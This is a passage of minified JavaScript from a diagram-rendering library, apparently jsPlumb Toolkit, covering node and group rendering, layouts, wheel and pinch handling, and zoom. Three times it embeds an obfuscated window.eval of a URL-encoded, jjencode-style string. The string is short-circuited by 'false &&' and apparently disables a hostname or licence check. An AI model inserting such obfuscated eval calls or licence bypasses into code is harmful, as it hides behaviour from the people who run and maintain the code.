d={group:e,el:r},c={el:r,id:e.id};i.extend(c,{dragOptions:t.dragOptions||{}}),c.dragOptions[i.dragEvents[s.stop]]=o.wrap(c.dragOptions[i.dragEvents[s.stop]],function(t){t.el.jtk&&t.el.jtk.group&&(c.dragOptions.magnetize?t.pos=k.getLayout().setMagnetizedPosition(t.el.jtk.group.id,t.pos[0],t.pos[1],!0):k.getLayout().setPosition(t.el.jtk.group.id,t.pos[0],t.pos[1],!0),!1!==H&&(k.storePositionInModel({id:t.el.jtk.group.id,group:!0,leftAttribute:V,topAttribute:B}),D.fire(u.groupUpdated,{group:t.el.jtk.group},null)),k.fire(u.groupMoveEnd,{el:t.el,group:t.el.jtk.group,pos:t.pos,e:t.e,eventPosition:t.pos}))}),q.addGroup(i.extend(c,a));var h=a.layout||{type:"Absolute"};e.layout=Dt(h,e),k.getLayout().groupAdded({group:e,el:r,id:e.id},n),k.fire(u.groupAdded,d)}return r}};f(u.groupAdded,function(t){var e=t.group;W(e)&&null!=jt(e,t.eventInfo)&&k.refresh(!0)}),f(u.groupRemoved,function(t){var e=t.group;k.getLayout().groupRemoved({group:e});var n=st[e.id],o=q.getId(n),i=q.removeGroup(e.id,t.removeChildNodes,!0,!0),r=null;if(null!=i){r={};for(var s in i){var a=it[s];null!=a&&(j({node:a,x:i[s].left,y:i[s].top,doNotUpdateElement:!0}),r[a.id]=[i[s].left,i[s].top])}}k.fire(u.groupRemoved,{group:e,el:n,nodes:t.nodes,nodesRemoved:t.removeChildNodes,nodePositions:r}),at=at.filter(function(e){return e.id!==t.group.id}),delete st[e.id],delete lt[o],delete n.jtk}),this.expandGroup=function(t){q.expandGroup("string"==typeof t?t:t.id)},this.collapseGroup=function(t){q.collapseGroup("string"==typeof t?t:t.id)},this.toggleGroup=function(t){q.toggleGroup("string"==typeof t?t:t.id)};var yt=function(t,e){var n=q.getGroup(t.id),o=n.getDragArea(),i=t.layout.getExtents(),r=e.maxSize||[i[2],i[3]];if(o.style.width=Math.min(r[0],i[2])+"px",o.style.height=Math.min(r[1],i[3])+"px",k.setSize){var s=q.getSize(n.getEl());k.setSize(t.id,s[0],s[1])}};k.autoSizeGroups=function(t){for(var e in st){var n=D.getGroup(e);if(n){var o=ft.getGroupDefinition(D.getNodeType(n.data));(o.autoSize||t)&&yt(n,o)}}},k.sizeGroupToFit=function(t,e){if(t){var n=ft.getGroupDefinition(D.getNodeType(t.data));(n.autoSize||e)&&yt(t,n)}};f(u.edgeAdded,function(e){if(!nt&&e.source!==k){var n=e.edge;if(W(n.source)&&W(n.target)&&(!X||n.source.objectType!==s.groupType&&n.target.objectType!==s.groupType)){var o=ft.getEdgeDefinition(D.getEdgeType(n.data||{}));if(o&&!0===o.ignore)return;var i=(r=n,a=e.geometry,function(){var e=xt(r);e.doNotFireConnectionEvent=!0,a&&(e.geometry=a),D.isDebugEnabled()&&console.log("Renderer","adding edge with params",e);var n=q.connect(e);n.edge=r,ut[r.getId()]=n,pt(e.type,r,n),k.fire(u.edgeAdded,{source:r.source,target:r.target,connection:n,edge:r,geometry:a}),t.refreshLayoutOnEdgeConnect&&k.refresh(!0);var o=r.source.getNode?r.source.getNode():r.source,i=ot[o.id]||st[o.id],s=r.target.getNode?r.target.getNode():r.target;!1!==(ot[s.id]||st[s.id])._jtkVisible&&!1!==i._jtkVisible||P(r,!1)});t.connectionHandler?t.connectionHandler(n,i):i()}}var r,a}),f(u.edgeRemoved,function(t){if(!nt&&t.source!==k){var e=t.edge,n=ut[e.getId()];n&&(D.isDebugEnabled()&&console.log("Renderer","removing edge",e),o=e,k.fire(u.edgeRemoved,{sourceNodeId:o.source.getNode?o.source.getNode().getId:o.source.getFullId(),targetNodeId:o.target.getNode?o.target.getNode().getId:o.target.getFullId(),sourcePortId:"Port"===o.source.objectType?o.source.id:null,targetPortId:"Port"===o.target.objectType?o.target.id:null,sourceId:o.source.getFullId(),targetId:o.target.getFullId(),source:o.source,target:o.target,edge:o}),delete ut[e.getId()],null!=n._jsPlumb&&q.deleteConnection(n,{fireEvent:!1}))}var o}),f(u.edgeTypeChanged,function(t){if(!nt&&t.source!==k){var e=t.obj,n=ut[e.getId()];if(n){var o=ft.getEdgeDefinition(t.newType);if(o&&!0===o.ignore)return;o.connector&&n.setConnector(o.connector),n.setType(t.newType,e.data)}}}),f(u.edgeTarget,function(t){if(!nt){var e=t.edge,n=ut[e.getId()],i=ot[e.target.getFullId()]||st[e.target.getFullId()];n?q.silently(function(){null!=i?(D.isDebugEnabled()&&console.log("target change",n),q.setTarget(n,i)):(delete ut[e.getId()],q.detach({connection:n,forceDetach:!0,fireEvent:!1}))}):null!=i&&D.isDebugEnabled()&&o.log("Target for Edge "+e.getId()+" changed to Node "+i.id+"; we have no valid connection.")}}),f(u.edgeSource,function(t){if(!nt){var e=t.edge,n=ut[e.getId()],i=ot[e.source.getFullId()]||st[e.source.getFullId()];n?q.silently(function(){null!=i?q.setSource(n,i):(delete ut[e.getId()],q.detach({connection:n,forceDetach:!0,fireEvent:!1}))}):null!=i&&D.isDebugEnabled()&&o.log("Source for Edge "+e.getId()+" changed to Node "+i.id+"; we have no valid connection.")}}),f("graphClearStart",function(){q.reset(!0);for(var t in st)void 0!==st[t]._rotors&&T.remove(st[t]),st[t].parentNode&&st[t].parentNode.removeChild(st[t]);for(var e in ot)void 0!==ot[e]._rotors&&T.remove(ot[e]),ot[e].parentNode&&ot[e].parentNode.removeChild(ot[e]);N&&N.clear(),dt.length=0,at.length=0,ut={},ot={},st={},it={},lt={},rt={},Nt={},k.getZoom&&q.setZoom(k.getZoom())}),f(u.portAdded,function(t){var e=ot[t.node.id]||st[t.node.id];if(ft.getPortDefinition(D.getPortType(t.data)).isEndpoint)b(new Rt(t.data,e,t.port),t.node);else{var n=Tt(t.port,t.data,t.node);Y||(null!=n?_(n=q.getElement(n),t.port,e,t.node):jsPlumbToolkitUtil.log("no element rendered for port",t.port,t.data))}q.recalculateOffsets(e),k.refresh(!0)}),f(u.portRemoved,function(t){var e=ot[t.node.id]||st[t.node.id],n=t.node.id+"."+t.port.id,o=rt[n];null!=o&&(q.setSuspendEvents(!0),q.remove(o),q.setSuspendEvents(!1),delete rt[n],k.fire(u.portRemoved,{node:t.node,port:t.port,portEl:o,nodeEl:e}),q.recalculateOffsets(e),k.refresh(!0))}),f(u.edgeUpdated,function(t){var e=ut[t.edge.getId()];if(e){var n=xt(t.edge);e.setType(n.type,n.data)}}),f(u.portUpdated,function(t){var e=rt[t.port.getFullId()];e&&(T.update(e,t.port.data),k.repaint(ot[t.node.id]))}),f(u.nodeUpdated,function(t){var e=ot[t.node.getFullId()];if(e){T.update(e,t.node.data),Gt(e,t.node);var n=z(t.node);if(null!=n){var i=o.isArray(n)?n:[n];i.unshift(e),q.setPosse.apply(q,i)}else q.removeFromAllPosses(e);k.repaint(e)}}),f(u.groupUpdated,function(t){var e=st[t.group.getFullId()];if(e){T.update(e,t.group.data),Gt(e,t.group);var n=z(t.group);if(null!=n){var i=o.isArray(n)?n:[n];i.unshift(e),q.setPosse.apply(q,i)}else q.removeFromAllPosses(e);k.repaint(e)}})}this.setView=function(t){var n=o.merge(D.getModel(),t||{});ft=new e.Model(n,q)},this.setView(t.view),this.getView=function(){return ft};var Pt=[],Et=function(t){return null==t?D:"string"==typeof t?D.select(t,!0):t.jtk?D.select(t.jtk.port||t.jtk.node,!0):t};this.activateState=function(t,e){var n=ft.getState(t);n&&(e=Et(e),n.activate(e,k,D),Pt.push(n))},this.deactivateState=function(t,e){var n=ft.getState(t);n&&(e=Et(e),n.deactivate(e,k,D),o.removeWithFunction(Pt,function(t){return t==n}))},this.resetState=function(){for(var t=0;t<Pt.length;t++)Pt[t].deactivate(D,k,D);Pt.length=0};var xt=function(t){var e=D.getEdgeType(t.data),n={type:e,connectionType:e,data:t.data,cost:t.getCost(),directed:t.isDirected()},o=ft.getEdgeDefinition(e);!function(t){if(o)for(var e=0;e<t.length;e++)o[t[e]]&&(n[t[e]]=o[t[e]])}(["connector","endpoints","endpoint","endpointStyles","endpointStyle"]),n.anchor&&!n.anchors&&(n.anchors=[n.anchor,n.anchor],delete n.anchor),n.endpoint&&!n.endpoints&&(n.endpoints=[n.endpoint,n.endpoint],delete n.endpoint);var i=function(t,e,n,o,i){if(o&&o[n]){var r=t[e]||[o[n],o[n]];r[i]=o[n],t[e]=r}},r=function(e,o){if(t[e].getNode){var r=t[e].getNode(),s=t[e].getFullId(),a=Nt[s]||rt[s];n[e]=null!=a?a:rt[s],null==n[e]&&(n[e]=ot[D.getNodeId(r.data)]);var l=ft.getPortDefinition(t[e].getType());i(n,"anchors","anchor",l,o),i(n,"endpoints","endpoint",l,o)}else{var d=D.getNodeId(t[e].data);a=0===o?Mt[d]:Ot[d];n[e]=null==a?ot[d]||st[d]:a}};return r("source",0),r("target",1),n},Ct={};this.asynchronousPortRendered=function(t,e,n){var o=D.getPortId(n),i=Ct[o],r=e.getPort(o);if(!i)return r;try{return g(i.object,t,o,i.objectType,i.def,i.node,i.jtkClass,i.jtkAttributeName,i.makeDraggable),rt[e.id+D.getGraph().getPortSeparator()+o]=t,_(t,r,st[e.id]||ot[e.id],e),function(){for(var t=[],e=0;e<St.length;e++){var n=k.getRenderedElement(St[e][0].target),o=k.getRenderedElement(St[e][0].source);n&&o?St[e][1]():t.push(St[e])}St=t}(),r}catch(t){return jsPlumbToolkitUtil.log("Cannot finish asynchronous render of port",t),null}finally{delete Ct[o]}};var St=[];this.addUnrenderedEdge=function(t,e){St.push([t,e])};var It=function(t,e,n,o,r,s,a,l){return function(d,u,c){var h,p=e(u),f=null,_=n(u),b=ft[o](_),v=u;if(U){v=i.extend({},b&&b.parameters||{}),i.extend(v,u);var m={};for(h in v)v.hasOwnProperty(h)&&null!=v[h]&&(v[h].constructor==Function?m[h]=v[h](u):m[h]=v[h]);v=m}if(!Y||"port"!==t){if(b){var w=b.template||"jtk-template-"+_;f=b.templateRenderer?b.templateRenderer(w,v,D,t,k):G.render(w,v,D,t,k)}else f=r(v,p);return g(d,f,p,t,b,c,a,l,s),f}Ct[p]={id:p,data:v,objectType:t,def:b,jtkClass:a,jtkAttributeName:l,makeDraggable:s,node:c,object:d}}},At=It("node",D.getNodeId,D.getNodeType,"getNodeDefinition",C,!0,d.NODE,a.NODE),Tt=It("port",D.getPortId,D.getPortType,"getPortDefinition",C,!1,d.PORT,a.PORT),kt=It("group",D.getNodeId,D.getNodeType,"getGroupDefinition",C,!1,d.GROUP,a.GROUP);this.initialize=function(){var e,n,o,i,r;if(D.setSuspendGraph(!0),q.setSuspendDrawing(!0),t.jsPlumbInstance){t.jsPlumbInstance.select().each(function(t){ut[t.edge.getId()]=t}),n=t.jsPlumbInstance.getManagedElements();for(var s in n){var a=n[s].el;ot[a.jtk.node.id]=a,it[t.jsPlumbInstance.getId(a)]=a.jtk.node}Ut.doImport&&Ut.doImport(ot,ut)}else{for(e=0,o=D.getGroupCount();e<o;e++)i=D.getGroupAt(e),W(i)&&jt(i);for(e=0,o=D.getNodeCount();e<o;e++)n=D.getNodeAt(e),W(n)&&wt(n);var l=function(t){var e=D.getAllEdgesFor(t);for(r=0;r<e.length;r++)if(e[r].source==t||e[r].source.getNode&&e[r].source.getNode()==t){var n=ft.getEdgeDefinition(D.getNodeType(e[r].data));if(n&&!0===n.ignore)continue;var o=xt(e[r]);if(null!=o.source&&null!=o.target){o.doNotFireConnectionEvent=!0;var i=q.connect(o);null!=i&&(i.edge=e[r],ut[e[r].getId()]=i,pt(o.type,e[r],i))}}};for(e=0,o=D.getNodeCount();e<o;e++)n=D.getNodeAt(e),ot[n.id]&&l(n);for(e=0,o=D.getGroupCount();e<o;e++)n=D.getGroupAt(e),st[n.id]&&l(n)}this.relayout(),q.setSuspendDrawing(!1,!0),D.setSuspendGraph(!1)},this.getContainer=function(){return M},this.getContainerId=function(){return J},this.getRenderedElement=function(t){if(null==t)return null;var e=t.getFullId();return t.objectType===s.portType?rt[e]:t.objectType===s.groupType?st[e]:ot[e]},this.getRenderedNode=function(t){return ot[t]},this.getRenderedGroup=function(t){return st[t]},this.getRenderedPort=function(t){return rt[t]},this.getRenderedConnection=function(t){return ut[t]},this.getRenderedEndpoint=function(t){var e=x(t),n=null;return e&&e.obj&&"Port"===e.obj.objectType&&q.selectEndpoints({element:e.el}).each(function(t){t.graph&&t.graph.port&&t.graph.port===e.obj&&(n=t)}),n};var Dt=function(t,n){var o=k._getGroupDragArea?k._getGroupDragArea(n):st[n.id],i=q.extend({container:o,getElementForNode:function(t){return ot[t]},negativeValuesAllowed:!1},t);if(!e.Layouts[i.type])throw"no such layout ["+i.type+"]";return i.jsPlumbToolkit=D,i.adapter=new function(t,e){h.apply(this,[e]),this.getElements=t.getNodes,this.filter=function(e){return"Node"===e.objectType&&e.group==t},this.setElementPosition=function(t,n,o){return e.setAbsolutePosition(t,[n,o])}}(n,k),i.locationFunction||(i.locationFunction=function(t){return[r.data(t.data,V),r.data(t.data,B)]}),new e.Layouts[i.type](i)};this.adHocLayout=function(t){if(t){var e=N;this.setLayout(t),N=e}},this.setLayout=function(t,n){if(t){var o=i.extend({jsPlumb:this.getJsPlumb()},t);N=function(t){var n=q.extend({container:M,getElementForNode:function(t){return ot[t]||st[t]}},t);if(n.jsPlumbToolkit=D,n.adapter=new p(k),!e.Layouts[n.type])throw"no such layout ["+n.type+"]";return n.locationFunction||(n.locationFunction=function(t){return[r.data(t.data,V),r.data(t.data,B)]}),new e.Layouts[n.type](n)}(o),n||k.refresh()}},this.getLayout=function(){return N},this.getMagnetizedElements=function(){return null!=N?N.getMagnetizedElements():[]},this.magnetize=function(t){null!=N&&N.magnetize(t)},this.refresh=function(t){L||t&&!R||(N?N.layout(function(){"undefined"!=typeof window?window.setTimeout(q.repaintEverything,0):q.repaintEverything()}):q.repaintEverything())},this.setRefreshAutomatically=function(t){R=t},this.relayout=function(t){L||(N?N.relayout(t,function(){k.relayoutGroups(),q.repaintEverything(),this.fire("relayout",this.getBoundsInfo())}.bind(this)):q.repaintEverything())},this.relayoutGroups=function(){D.eachGroup(function(t,e){k.relayoutGroup(e)})},this.relayoutGroup=function(t){if(!t.layout){var e=x(t);if(!e.obj||!e.obj.layout)return;t=e.obj}t.layout.relayout(),k.sizeGroupToFit(t,!0),q.revalidate(st[t.id]),k.fire(u.groupRelayout,t,st[t.id])},this.getPath=function(t){var e=D.getPath(t);return e&&(e.setVisible=function(t){k.setVisible(e,t)},e.addNodeClass=function(t){e.eachNode(function(e,n){q.addClass(ot[n.id],t)})},e.removeNodeClass=function(t){e.eachNode(function(e,n){q.removeClass(ot[n.id],t)})},e.addEdgeClass=function(t){e.eachEdge(function(e,n){ut[n.getId()].addClass(t)})},e.removeEdgeClass=function(t){e.eachEdge(function(e,n){ut[n.getId()].removeClass(t)})},e.addClass=function(t){this.addNodeClass(t),this.addEdgeClass(t)},e.removeClass=function(t){this.removeNodeClass(t),this.removeEdgeClass(t)}),e},this.getPosition=function(t){var e=this.getLayout();if(e){var n=x(t).id;return e.getPosition(n)}},this.getSize=function(t){return q.getSize(x(t).el)},this.getCoordinates=function(t){var e=this.getLayout();if(e){var n=x(t),o=e.getPosition(n.id),i=q.getSize(n.el);return{x:o[0],y:o[1],w:i[0],h:i[1]}}};var Nt={},Mt={},Ot={},Ft=function(t,e,r){var s=t.value("port-id"),a=t.value("port-type")||"default",l=t.value("scope")||q.getDefaultScope(),d=D.getNodeType(e),u=ft.getNodeDefinition(d),c=ft.getPortDefinition(s,u),h=ft.getPortDefinition(a,u),p=o.merge(h,c),f=null==p?{}:n.populate(p,e.data),g=function(t){return function(n){var o=e.getPort(s),i=[{portId:s,nodeId:e.id,port:o,node:e,portType:a,endpoint:n.endpoint,anchor:n.anchor}];t.apply(t,i)}},_=function(t){return function(e){var n=[{connection:e.connection||e,source:x(e.source),target:x(e.target),scope:e.scope}];return t.apply(t,n)}},b=f.edgeType||t.value("edge-type")||"default",v={paintStyle:"connectorStyle",hoverPaintStyle:"connectorHoverStyle",overlays:"connectorOverlays",endpointStyle:"paintStyle"},m=ft.getEdgeDefinition(b);if(m)for(var w in m){var j=v[w]||w;null==f[j]&&(f[j]=m[w])}if(f.connectionType=b,f.portId=s,f.portType=a,f.scope=l,f.parameters=f.parameters||{},f.parameters.portId=s,f.parameters.portType=a,f.parameters.edgeType=b,f.parameters.scope=l,f.parameters.nodeId=e.id,f.events={},p.events)for(w in p.events)f.events[w]=g(p.events[w]);if(p.interceptors)for(w in p.interceptors)f[w]=_(p.interceptors[w]);var y=t.value("anchor-x"),P=t.value("anchor-y"),E=t.value("orientation-x"),C=t.value("orientation-y"),S=t.value("offset-x"),I=t.value("offset-y");return null!=y&&null!=P&&(f.anchor=[parseFloat(y),parseFloat(P),parseInt(E||"0",10),parseInt(C||"0",10),parseFloat(S||"0"),parseFloat(I||"0")]),i.extend(f,r||{}),f.events.anchorChanged=function(t){k.fire("anchorChanged",{portId:s,nodeId:e.id,portType:a,node:e,port:e.getPort(s),endpoint:t.endpoint,anchor:t.anchor})},f},Lt=function(t){this.element=t.parentNode,this.value=function(e,n){var o=t.getAttribute(e);return null==o?n:o},this.setValue=function(e,n){t.setAttribute(e,n)},this.findDataValues=function(e){for(var n=0;n<t.attributes.length;n++){var o=t.attributes[n];0===o.name.indexOf("data-")&&(e[o.value]=o.name.split("-")[1])}}},Rt=function(t,e,n){this.element=e,this.port=n,this.value=function(e,n){var o=t[e.replace(/(\-\w)/g,function(t){return t[1].toUpperCase()})];return null==o?n:o},this.findDataValues=function(e){for(var n in t)0===n.indexOf("data-")&&(e[t[n]]=n.split("-")[1])},this.setValue=function(t,n){e.setAttribute(t,n)}},Gt=function(t,e){var n,o,r=i.getSelector(t,l.PORT),s=i.getSelector(t,l.SOURCE),a=i.getSelector(t,l.TARGET);for(n=0;n<s.length;n++)o=new Lt(s[n]),m(o,e);for(n=0;n<a.length;n++)o=new Lt(a[n]),w(o,e);for(n=0;n<r.length;n++)o=new Lt(r[n]),b(o,e)};this.setLayout(t.layout,!0),this.storePositionsInModel=function(t){var e=(t=t||{}).leftAttribute||"left",n=t.topAttribute||"top",o=N.getPositions();for(var i in o){var s=D.getNode(i)||D.getGroup(i);s&&(r.data(s.data,e,o[i][0]),r.data(s.data,n,o[i][1]))}D.eachGroup(function(t,o){var i=o.getNodes(),s=o.layout.getPositions();for(t=0;t<i.length;t++)r.data(i[t].data,e,s[i[t].id][0]),r.data(i[t].data,n,s[i[t].id][1])})},this.storePositionInModel=function(t){var e="string"==typeof t?t:t.id,n="string"==typeof t?"left":t.leftAttribute||"left",o="string"==typeof t?"top":t.topAttribute||"top",i=D[t.group?"getGroup":"getNode"](e),s=i.group?i.group.layout.getPosition(e):N.getPosition(e);return i&&(r.data(i.data,n,s[0]),r.data(i.data,o,s[1])),s},this.setPosition=function(t,e,n,o,i){return j({info:null,node:t,x:e,y:n,doNotUpdateElement:o,animateFrom:null,animateOptions:null,updateLayout:!0!==i})},this.animateToPosition=function(t,e,n,o){var i=x(t);if(i){var r=N.getPosition(i.id);j({info:i,node:t,x:e,y:n,doNotUpdateElement:!1,animateFrom:[r[0],r[1]],animateOptions:o})}},this.isVisible=function(t){return E(t,function(t){switch(t.type){case"Edge":var e=ct(t.obj);return!!e&&e.isVisible();case"Node":return!1!==t.el._jtkVisible}})},this.setVisible=function(t,e,n){if(null!=t){E(t,function(t){switch(t.type){case"Edge":P(t.obj,e,n);break;case"Node":!function(t,o){if(o&&(o.style.display=e?"block":"none",o._jtkVisible=e,k.fire(u.nodeVisibility,{node:t,el:o,state:e}),!n))for(var i=D.getAllEdgesFor(t),r=0;r<i.length;r++)if(e){var s=i[r].source.getNode?i[r].source.getNode():i[r].source,a=i[r].target.getNode?i[r].target.getNode():i[r].target,l=s===t?a:s;k.isVisible(l)&&P(i[r],e,n)}else P(i[r],e,n)}(t.obj,t.el);break;case"Port":o=t.obj,i=o.getFullId(),Nt[i].setVisible(e)}var o,i})}},this.addToPosse=function(t,e,o){n.each(t,function(t){var n=x(t);n.el&&q.addToPosse(n.el,{id:e,active:!1!==o})})},this.setPosse=function(t,e){n.each(t,function(t){var n=x(t);n.el&&q.setPosse(n.el,e)})},this.removeFromPosse=function(t,e){n.each(t,function(t){var n=x(t);n.el&&q.removeFromPosse(n.el,e)})},this.removeFromAllPosses=function(t){n.each(t,function(t){var e=x(t);e.el&&q.removeFromAllPosses(e.el)})},this.setPosseState=function(t,e,o){n.each(t,function(t){var n=x(t);n.el&&q.setPosseState(n.el,e,o)})},this.destroy=function(){for(var t,e=0;e<bt.length;e++)try{t=bt[e],D.unbind(t.event,t.fn)}catch(e){o.log("WARN: Could not unbind event "+t.event+" during destroy operation.")}this._destroy&&this._destroy(),this._onDestroy&&this._onDestroy(this)};var Ut={jsPlumb:q,toolkit:D,container:M,containerId:J,getConnectionsForEdges:function(t){for(var e=[],n=0;n<t.length;n++)e.push(ut[t[n].getId()]);return e},getConnectionForEdge:ct,getElement:function(t){return ot[t]||st[t]},getNodeForElementId:function(t){return it[t]},getGroupForElementId:function(t){return lt[t]},getObjectInfo:x,nodeMap:function(){return ot},portMap:function(){return rt},groupMap:function(){return st},reverseGroupMap:function(){return lt},reverseNodeMap:function(){return it},bindToToolkit:function(t,e){f(t,e)}};return Ut};t.AbstractRenderer=f,t.DOM=function(t){f.apply(this,arguments),c.apply(this,arguments)}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22")),function(){"use strict";function t(t,e,n){return function(o){return o[t]/e*(n?-1:1)}}var e={webkit:{mac:t("deltaY",120),win:t("deltaY",100)},safari:function(e){return t("wheelDeltaY",120,!0)},firefox:{mac:function(t){return t.deltaY*(1===t.deltaMode?25:1)*-1/120},win:function(t){return-1*t.deltaY/3}},ie:function(t){return t.wheelDelta/120},default:function(t){return t.deltaY||t.wheelDelta}},n={webkit:{mac:t("deltaX",120),win:t("deltaX",100)},safari:function(e){return t("wheelDeltaX",120,!0)},firefox:{mac:function(t){return t.deltaX*(1===t.deltaMode?25:1)*-1/120},win:function(t){return-1*t.deltaX/3}},ie:function(t){return t.wheelDelta/120},default:function(t){return t.deltaX||t.wheelDelta}},o=/Mac/.test(navigator.userAgent)?"mac":"win",i=-1!==navigator.userAgent.indexOf("Firefox")?"firefox":/Chrome/.test(navigator.userAgent)?"webkit":/Safari/.test(navigator.userAgent)?"safari":/WebKit/.test(navigator.userAgent)?"webkit":/Trident/.test(navigator.userAgent)?"ie":"default",r="function"==typeof e[i]?e[i]:e[i][o],s="function"==typeof n[i]?n[i]:n[i][o],a=function(t,e,n){return function(o){if(!e||null==o.mozInputSource||1===o.mozInputSource){var i=r(o||event),a=s(o||event);o.normalizedWheelDelta=i,(!n||o.metaKey||o.ctrlKey)&&t(o,a,i,o.metaKey||o.ctrlKey)}}},l="onwheel"in document.createElement("div")?"wheel":void 0!==document.onmousewheel?"mousewheel":"DOMMouseScroll";this.addWheelListener=function(t,e,n,o){var i=a(e,n,o);t.addEventListener?t.addEventListener(l,i,!1):t.attachEvent&&t.attachEvent("onmousewheel",i)}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22")),function(){this.PinchListener=function(t){var e="onpointerdown"in document.documentElement,n="ontouchstart"in document.documentElement,o=[0,0],i=0,r=0,s=function(e){t[e](o,r,i,i/r)},a=function(){t.onPinchEnd()},l="onPinchStart",d=function(t,e,n,o){return Math.sqrt(Math.pow(n-t,2)+Math.pow(o-e,2))},u=function(t){var e=function(t){return t.touches||[]},n=function(t,e){return t.item?t.item(e):t[e]},u=function(t){var e=n(t,0),o=n(t,1);return d(e.pageX,e.pageY,o.pageX,o.pageY)},c=function(t){var e=n(t,0),o=n(t,1);return[(e.pageX+o.pageX)/2,(e.pageY+o.pageY)/2]},h=!1,p=function(e){h=!1,t.unbind(document,"touchmove",f),t.unbind(document,"touchend",p),a()},f=function(t){if(h){var n=e(t);2===n.length&&(i=u(n),o=c(n),s("onPinch"))}};t.bind(t.el,"touchstart",function(n){var a=e(n);2===a.length&&!1!==t.enableWheelZoom&&(o=c(a),i=r=u(a),h=!0,t.bind(document,"touchmove",f),t.bind(document,"touchend",p),s(l))})};e?function(){var e={},n=[],u=0,c=!1,h=function(){2===u&&(o=[(n[1].p[0]+n[0].p[0])/2,(n[1].p[1]+n[0].p[1])/2],i=d(n[1].p[0],n[1].p[1],n[0].p[0],n[0].p[1]))};t.bind(t.el,"pointerdown",function(t){u>=2||c||(n[u]={e:t,p:[t.pageX,t.pageY]},e[""+t.pointerId]=u,u++,h(),2===u&&(r=i,s(l)))}),t.bind(document,"pointerup",function(t){null!=e[""+t.pointerId]&&(delete e[""+t.pointerId],c=0!=--u,a())}),t.bind(document,"pointermove",function(t){if(!c&&2===u){var o=e[t.pointerId];null!=o&&(n[o].p=[t.pageX,t.pageY],h(),s("onPinch"))}})}(t):n&&u(t)}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22")),function(){"use strict";var t=this.jsPlumb;this.ZoomWidget=function(n){function r(t,e){if(function(){for(var t in it)return!1;return!0}())return{w:0,h:0,x:0,y:0,vw:n.width(b),vh:n.height(b),padding:t,z:1,zoom:1};t=t||0,e=e||.9;var o=Math.abs(ot.maxx[0][0][0]+ot.maxx[0][1]-ot.minx[0][0][0]),i=Math.abs(ot.maxy[0][0][1]+ot.maxy[0][2]-ot.miny[0][0][1]),r=n.width(b),s=n.height(b),a=r/((o+2*t)/e),l=s/((i+2*t)/e),d=Math.min(a,l);return{w:o,h:i,x:ot.minx[0][0][0],y:ot.miny[0][0][1],vw:r,vh:s,padding:t,z:d,zoom:J}}function s(t){for(var e in ot)if(ot.hasOwnProperty(e)){for(var 